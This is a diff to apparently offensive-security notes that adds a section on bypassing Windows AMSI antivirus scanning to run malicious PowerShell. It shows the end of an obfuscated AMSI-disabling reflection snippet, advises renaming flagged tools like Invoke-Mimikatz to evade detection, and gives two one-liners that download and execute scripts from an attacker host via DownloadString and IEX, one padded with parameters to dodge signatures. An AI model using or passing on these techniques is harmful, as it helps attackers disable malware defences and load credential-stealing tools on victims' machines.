@@ -15,3 +15,18 @@ Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
 $g=$f.SetValue($null,$true)
 ```
 
+
+### Bypassing AMSI to execute malicious scripts 
+
+- ASMI Bypass Powershell code with inspiration from (https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)
+	- use ASBB.ps1 as a base
+	- If downloading scripts that will be flagged by AMSI, rename them
+	- add download code for these scripts at the end of ASBB.ps1
+	- example for `Invoke-Mimikatz.ps1` which is renamed to `IM.ps1`
+```powershell
+(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip7/IM.ps1') | IEX
+```
+- Download example
+```powershell
+iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/ASBB.ps1')”
+```
